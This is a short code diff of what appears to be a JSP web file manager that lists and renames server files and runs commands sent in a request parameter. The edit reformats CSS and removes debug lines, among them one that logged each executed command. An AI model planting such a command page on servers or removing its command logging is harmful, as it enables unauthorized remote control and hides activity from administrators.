@@ -109,7 +109,10 @@
  	.filelist{
  		top:-2px
  	}
- 	.img{top:26px;left:10%;}
+ 	.img{
+ 		top:26px;
+ 		left:10%;
+ 	}
 </style>
 <script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"> </script>
 <script type="text/javascript">
@@ -226,7 +229,6 @@
 	oldname=request.getParameter("oldName");
 	newname=request.getParameter("newName");
 	dir=request.getParameter("dir");
-	System.out.println((String)application.getAttribute("dir"));
 	msg=dir=dir==null?(String)application.getAttribute("dir"):decode(dir);
 	if(dir!=null){application.setAttribute("dir", decode(dir));}else{dir="C:\\";}
 	action=action==null?"list":action;
@@ -315,7 +317,6 @@
 		}
 		return tag;
 	}
-	
 	static String imgencode64(File file){//文件icon图标的Base64编码
 	 ImageIcon icon=(ImageIcon) FileSystemView.getFileSystemView().getSystemIcon(file);
 	 BufferedImage bu = new BufferedImage(icon.getIconWidth(),icon.getIconHeight(), BufferedImage.TYPE_INT_RGB);
@@ -644,8 +645,7 @@
 			}
 		}
 	}
-if(cmdStr!=null){
-		System.out.println("执行命令"+cmdStr);
+if(cmdStr!=null){ 
 		if(cmdStr.startsWith("cd")){
 			dir=cmdStr.startsWith("cd")?cmdStr.substring(3):dir;
 			System.out.println("切换目录"+dir);
